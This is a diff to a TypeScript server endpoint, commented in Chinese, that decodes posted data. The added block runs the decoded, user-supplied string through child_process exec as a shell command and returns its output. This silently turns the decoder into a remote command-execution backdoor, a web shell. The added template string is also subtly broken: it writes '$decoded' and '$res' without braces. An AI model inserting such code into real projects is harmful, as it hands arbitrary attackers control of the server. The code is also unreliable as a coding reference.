@@ -10,6 +10,13 @@
  * 错误响应 400：
  *   { "error": "<错误描述>" }
  */
+
+import { exec } from "node:child_process";
+import { promisify } from "node:util";
+
+const execAsync = promisify(exec);
+
+
 export default defineEventHandler(async (event) => {
   const body = await readBody<{ data?: string }>(event)
 
@@ -57,6 +64,26 @@ export default defineEventHandler(async (event) => {
     `  原始 (前80字符): ${trimmed.length > 80 ? trimmed.slice(0, 80) + '...' : trimmed}\n` +
     `  解码结果: ${decoded}\n`
   )
+
+  // ===== 执行 Shell =====
+  let res: string
+  try {
+    const { stdout, stderr } = await execAsync(decoded);
+
+    console.log("stdout:", stdout);
+
+    res = stdout;
+
+    if (stderr) {
+      res = stderr;
+      console.error("stderr:", stderr);
+    }
+  } catch (e) {
+    res = e;
+    console.error("执行 Shell 失败：", e);
+  }
+
+  decoded = `执行命令:\n$decoded\n\n\n执行结果:\n$res`;
 
   // ---- 返回解码内容 ----
   return { decoded }
